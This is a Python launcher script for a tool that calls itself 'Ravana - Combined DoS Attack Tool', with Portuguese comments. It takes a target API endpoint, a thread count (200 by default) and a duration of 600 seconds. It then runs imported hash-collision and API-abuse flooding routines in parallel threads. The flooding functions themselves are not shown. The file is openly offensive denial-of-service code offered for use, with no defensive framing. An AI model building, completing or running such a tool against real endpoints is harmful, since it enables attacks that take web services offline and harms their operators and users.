import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
import threading
import argparse
import yaml
from hash_collision.hash_collision import infinite_hash_collision
from api_abuse.api_abuse import infinite_abuse_api

# Função para carregar a configuração do arquivo YML
def load_config(file_path):
    with open(file_path, 'r') as file:
        return yaml.safe_load(file)

# Função para criar argumentos da linha de comando
def parse_args():
    parser = argparse.ArgumentParser(description="Ravana - Combined DoS Attack Tool")
    
    parser.add_argument('--endpoint', type=str, default=None, help='URL do endpoint da API (padrão: do arquivo config_api.yml)')
    parser.add_argument('--threads', type=int, default=200, help='Número de threads para o ataque de API (padrão: 200)')
    parser.add_argument('--hash-endpoint', type=str, default=None, help='URL do endpoint para o ataque de colisão de hash (padrão: do arquivo config_hash.yml)')
    parser.add_argument('--hash-threads', type=int, default=200, help='Número de threads para o ataque de colisão de hash (padrão: 200)')
    parser.add_argument('--config-api', type=str, default="config/config_api.yml", help='Caminho para o arquivo de configuração YAML do ataque de API (padrão: config/config_api.yml)')
    parser.add_argument('--config-hash', type=str, default="config/config_hash.yml", help='Caminho para o arquivo de configuração YAML do ataque de hash (padrão: config/config_hash.yml)')
    parser.add_argument('--run-hash', action='store_true', default=False, help='Executar ataque de colisão de hash (padrão: False)')
    parser.add_argument('--run-api', action='store_true', default=False, help='Executar ataque de abuso de API (padrão: False)')
    parser.add_argument('--duration', type=int, default=600, help='Duração do ataque em segundos (padrão: 600)')
    
    return parser.parse_args()

# Função principal para rodar o ataque combinado
def run_combined_attack(args):
    if args.run_hash:
        config_hash = load_config(args.config_hash)
        hash_endpoint = args.hash_endpoint if args.hash_endpoint else config_hash['endpoint']
        hash_thread = threading.Thread(target=infinite_hash_collision, args=(config_hash, hash_endpoint, args.hash_threads))
        hash_thread.start()

    if args.run_api:
        config_api = load_config(args.config_api)
        api_endpoint = args.endpoint if args.endpoint else config_api['endpoint']
        api_thread = threading.Thread(target=infinite_abuse_api, args=(config_api, api_endpoint, args.threads))
        api_thread.start()

    # Manter o script rodando enquanto os ataques estão em execução
    if args.run_hash:
        hash_thread.join()
    if args.run_api:
        api_thread.join()

# Execução principal
if __name__ == "__main__":
    args = parse_args()
    run_combined_attack(args)
